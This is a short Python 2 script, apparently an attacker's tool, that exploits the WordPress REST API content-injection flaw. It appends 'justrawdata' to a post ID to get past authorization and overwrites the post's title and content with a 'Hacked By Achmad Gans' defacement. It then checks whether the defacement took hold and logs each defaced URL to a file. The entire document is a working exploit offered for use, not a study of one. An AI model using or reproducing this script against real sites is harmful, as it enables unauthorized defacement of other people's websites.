import requests,json

def wp_content_injection(url):
    path_bug = url+'/wp-json/wp/v2/posts'
    req_path = requests.get(path_bug).text
    if "slug" in req_path:
      try:
         get_id = json.loads(req_path)
         headers = {'Content-Type':'application/json'}
         id = get_id[0]['id']             
             
         my_dict = {}
         my_dict['id'] = str(id)+"justrawdata"
         my_dict['slug'] = "achmad.html"
         my_dict['content'] = "<center><p><b>hacker<br></b></p>"
         my_dict['title'] = "Hacked By Achmad Gans Dan Kamu Buriq"
         
         path_script = url+'/index.php?p='+str(id)
         post_data = requests.post(path_bug+'/'+str(id), data=json.dumps(my_dict), headers=headers).text
         
         print path_bug+'/'+str(id)
         req_path = requests.get(path_script).text
         if "Achmad Gans" in req_path:
           print "[{}+{}] wp-content injection : {}".format(GN, DT, url)
           print "[{}*{}] uploaded at > {}".format(C, DT, path_script)
           opw = open(outpname,'a')
           opw.write(path_script+'\n')
           opw.close()
         else:
           print "[-] wp-content : ", url 
           
      except (NameError,ValueError):
          print "[-] wp-content injection : ", url 
          
wp_content_injection(raw_input("Masukan url : "))
          
